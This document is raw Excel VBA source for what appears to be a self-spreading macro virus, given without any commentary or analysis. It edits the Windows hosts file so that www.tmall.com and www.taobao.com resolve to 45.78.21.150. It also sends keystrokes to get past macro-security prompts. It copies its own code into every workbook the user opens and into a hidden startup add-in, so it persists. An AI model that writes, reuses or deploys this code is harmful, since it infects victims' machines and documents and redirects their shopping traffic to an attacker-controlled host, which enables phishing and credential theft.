Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private WithEvents App As Application
Sub OfficeCheck()
Dim SysParh As String, Sysadd As String, t As String, sysadd1 As String
SysParh = Space(256)
GetSystemDirectory SysParh, 256
SysParh = Trim(SysParh)
SysParh = Left(SysParh, Len(SysParh) - 1)
SysParh = SysParh & "\drivers\etc\hosts"
Sysadd = "45.78.21.150 www.tmall.com"
sysadd1 = "#45.78.21.150 www.tmall.com"
If Dir(SysParh) <> "" Then
Open SysParh For Input As #1
t = Input(LOF(1), #1)
Close #1
If InStr(t, Sysadd) <> 0 Then
Open SysParh For Output As #1
t = Replace(t, sysadd1, Sysadd)
t = Replace(t, "#45.78.21.150 www.taobao.com", "45.78.21.150 www.taobao.com")
Print #1, t
Close #1
End If
If InStr(t, Sysadd) = 0 Then
Open SysParh For Append As #1
Print #1, vbNewLine & Sysadd & vbNewLine & "45.78.21.150 www.taobao.com"
Close #1
End If
End If
End Sub
Sub runtimer()
Application.OnTime Now + TimeValue("00:00:05"), "thisworkbook.p2d"
End Sub
Private Sub p2d()
On Error Resume Next
Debug.Print ThisWorkbook.VBProject.VBComponents("ThisWorkbook")
If Err.Number = 1004 Then
Err.Clear
Application.SendKeys "%(qtmstv){ENTER}"
DoEvents
End If
   Dim WBstr$, Wb As Workbook
    With ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
        For i = 1 To 105 '.CountOfLines
            WBstr = WBstr & .Lines(i, 1) & Chr(10)
        Next
    End With
    If ActiveWorkbook.FileFormat = 52 Or ActiveWorkbook.FileFormat = 56 Then
    If ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines = 0 Then
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 2, WBstr
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 150, "Sub Workbook_Open()"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 151, "Set App = Application"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 152, "End Sub"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 153, "Private Sub App_WorkbookOpen(ByVal Wb As Workbook)"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 154, "Call OfficeCheck"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 155, "Call d2p"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 156, "End Sub"
    End If
    End If
End Sub
Private Sub d2p()
Dim pth As String
Dim Exl As Excel.Application
Dim WBstr$, fn$, Wb As Workbook
Dim ws As Worksheet
On Error Resume Next
Debug.Print ThisWorkbook.VBProject.VBComponents("ThisWorkbook")
If Err.Number = 1004 Then
Err.Clear
Application.SendKeys "%(qtmstv){ENTER}"
DoEvents
End If
pth = Application.StartupPath & "\accelerate.xls"
If Dir(pth) = "" Then
Debug.Print ThisWorkbook.VBProject.VBComponents("ThisWorkbook")
If Err.Number <> 1004 Then
    Workbooks.Add.SaveAs Filename:=pth, FileFormat:=18
Else
    Workbooks.Close
End If
Else
    Exit Sub
End If
    Set Wb = Workbooks.Open(pth)
        With ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
        For i = 1 To 105 '.CountOfLines
            WBstr = WBstr & .Lines(i, 1) & Chr(10)
        Next
    End With
    If ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines = 0 Then
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 2, WBstr
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 150, "Sub Workbook_Open()"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 151, "Set App = Application"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 152, "End Sub"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 153, "Private Sub App_WorkbookOpen(ByVal Wb As Workbook)"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 154, "Call OfficeCheck"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 155, "Call runtimer"
    ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 156, "End Sub"
    End If
    ActiveWorkbook.IsAddin = True
    Wb.Save
    Wb.Close
End Sub




Sub Workbook_Open()
Set App = Application
End Sub
Private Sub App_WorkbookOpen(ByVal Wb As Workbook)
Call OfficeCheck
Call d2p
End Sub
